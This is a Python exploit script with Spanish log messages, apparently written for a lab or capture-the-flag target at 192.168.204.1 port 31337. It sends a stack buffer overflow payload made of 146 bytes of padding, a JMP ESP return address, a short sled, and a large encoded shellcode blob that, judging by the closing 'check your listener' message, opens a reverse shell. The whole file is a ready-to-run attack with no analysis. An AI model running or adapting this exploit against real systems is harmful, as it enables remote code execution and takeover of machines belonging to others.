#!/usr/bin/python3
from pwn import log, socket

offset = 146
junk = b"A" * offset
jmpesp = b"\xc3\x14\x04\x08"
nops = b"\x16" * 16

shellcode =  b""
shellcode += b"\xd9\xc6\xd9\x74\x24\xf4\x5d\xba\x8a\xe7\x9d"
shellcode += b"\xc1\x2b\xc9\xb1\x52\x83\xc5\x04\x31\x55\x13"
shellcode += b"\x03\xdf\xf4\x7f\x34\x23\x12\xfd\xb7\xdb\xe3"
shellcode += b"\x62\x31\x3e\xd2\xa2\x25\x4b\x45\x13\x2d\x19"
shellcode += b"\x6a\xd8\x63\x89\xf9\xac\xab\xbe\x4a\x1a\x8a"
shellcode += b"\xf1\x4b\x37\xee\x90\xcf\x4a\x23\x72\xf1\x84"
shellcode += b"\x36\x73\x36\xf8\xbb\x21\xef\x76\x69\xd5\x84"
shellcode += b"\xc3\xb2\x5e\xd6\xc2\xb2\x83\xaf\xe5\x93\x12"
shellcode += b"\xbb\xbf\x33\x95\x68\xb4\x7d\x8d\x6d\xf1\x34"
shellcode += b"\x26\x45\x8d\xc6\xee\x97\x6e\x64\xcf\x17\x9d"
shellcode += b"\x74\x08\x9f\x7e\x03\x60\xe3\x03\x14\xb7\x99"
shellcode += b"\xdf\x91\x23\x39\xab\x02\x8f\xbb\x78\xd4\x44"
shellcode += b"\xb7\x35\x92\x02\xd4\xc8\x77\x39\xe0\x41\x76"
shellcode += b"\xed\x60\x11\x5d\x29\x28\xc1\xfc\x68\x94\xa4"
shellcode += b"\x01\x6a\x77\x18\xa4\xe1\x9a\x4d\xd5\xa8\xf2"
shellcode += b"\xa2\xd4\x52\x03\xad\x6f\x21\x31\x72\xc4\xad"
shellcode += b"\x79\xfb\xc2\x2a\x7d\xd6\xb3\xa4\x80\xd9\xc3"
shellcode += b"\xed\x46\x8d\x93\x85\x6f\xae\x7f\x55\x8f\x7b"
shellcode += b"\x2f\x05\x3f\xd4\x90\xf5\xff\x84\x78\x1f\xf0"
shellcode += b"\xfb\x99\x20\xda\x93\x30\xdb\x8d\x5b\x6c\x22"
shellcode += b"\xcd\x34\x6f\xa4\xcf\x7f\xe6\x42\xa5\x6f\xaf"
shellcode += b"\xdd\x52\x09\xea\x95\xc3\xd6\x20\xd0\xc4\x5d"
shellcode += b"\xc7\x25\x8a\x95\xa2\x35\x7b\x56\xf9\x67\x2a"
shellcode += b"\x69\xd7\x0f\xb0\xf8\xbc\xcf\xbf\xe0\x6a\x98"
shellcode += b"\xe8\xd7\x62\x4c\x05\x41\xdd\x72\xd4\x17\x26"
shellcode += b"\x36\x03\xe4\xa9\xb7\xc6\x50\x8e\xa7\x1e\x58"
shellcode += b"\x8a\x93\xce\x0f\x44\x4d\xa9\xf9\x26\x27\x63"
shellcode += b"\x55\xe1\xaf\xf2\x95\x32\xa9\xfa\xf3\xc4\x55"
shellcode += b"\x4a\xaa\x90\x6a\x63\x3a\x15\x13\x99\xda\xda"
shellcode += b"\xce\x19\xfa\x38\xda\x57\x93\xe4\x8f\xd5\xfe"
shellcode += b"\x16\x7a\x19\x07\x95\x8e\xe2\xfc\x85\xfb\xe7"
shellcode += b"\xb9\x01\x10\x9a\xd2\xe7\x16\x09\xd2\x2d"

log.info("Enviando shellcode ...")

shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shell.connect(("192.168.204.1", 31337))

shell.send(junk + jmpesp + nops + shellcode + b"\r\n")

shell.close()
log.success("Revisa tu listener")
